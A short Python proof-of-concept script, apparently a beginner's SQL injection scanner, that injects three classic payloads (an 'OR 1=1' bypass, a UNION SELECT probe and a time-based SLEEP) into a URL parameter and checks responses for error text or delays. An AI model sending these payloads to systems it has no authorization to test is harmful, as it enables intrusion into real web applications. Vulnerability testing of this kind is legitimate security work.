#!/usr/bin/env python3
"""
SQL Injection Detector PoC
Author: Arya
Description:
    A beginner-friendly proof-of-concept tool to test web applications for possible SQL Injection vulnerabilities.
    Only test on authorized systems like DVWA or your own apps.
"""

import requests
from bs4 import BeautifulSoup
import time

# Test payloads (non-destructive)
PAYLOADS = [
    "' OR '1'='1' --",            # Classic authentication bypass
    "' UNION SELECT null,null --", # Union-based test
    "' AND SLEEP(5) --"            # Time-based blind SQLi test
]

def test_sql_injection(target_url):
    print(f"[+] Testing target: {target_url}")
    headers = {"User-Agent": "SQLi-Detector-PoC/1.0"}
    results = []

    for payload in PAYLOADS:
        # Inject payload into URL parameter
        if "?" in target_url:
            test_url = target_url.split("=")[0] + "=" + payload
        else:
            print("[-] Invalid URL format. Must include ?param=value")
            return

        print(f"\n[>] Testing payload: {payload}")
        start_time = time.time()
        try:
            response = requests.get(test_url, headers=headers, timeout=10, verify=False)
            elapsed_time = time.time() - start_time

            soup = BeautifulSoup(response.text, "html.parser")
            page_text = soup.get_text().lower()

            # Detection logic
            indicators = []
            if any(err in page_text for err in ["sql syntax", "mysql", "syntax error", "odbc", "pdo"]):
                indicators.append("Possible SQL error in response")
            if "union" in payload.lower() and ("select" in page_text or "column" in page_text):
                indicators.append("Unexpected SQL keywords in response")
            if "sleep" in payload.lower() and elapsed_time > 4:
                indicators.append("Response delay suggests time-based SQLi")

            if indicators:
                results.append({
                    "payload": payload,
                    "url": test_url,
                    "indicators": indicators,
                    "response_time": elapsed_time
                })
                print(f"[!] Vulnerable indicator found: {indicators}")
            else:
                print("[OK] No obvious signs found for this payload.")

        except requests.exceptions.RequestException as e:
            print(f"[-] Request error: {e}")

    if results:
        print("\n=== Summary of Potential Vulnerabilities ===")
        for r in results:
            print(f"Payload: {r['payload']}")
            print(f"URL: {r['url']}")
            print(f"Indicators: {r['indicators']}")
            print(f"Response time: {r['response_time']:.2f}s")
            print("-" * 40)
    else:
        print("\n[+] No vulnerabilities detected with the test payloads.")

if __name__ == "__main__":
    target = input("Enter target URL (e.g. http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1): ").strip()
    test_sql_injection(target)
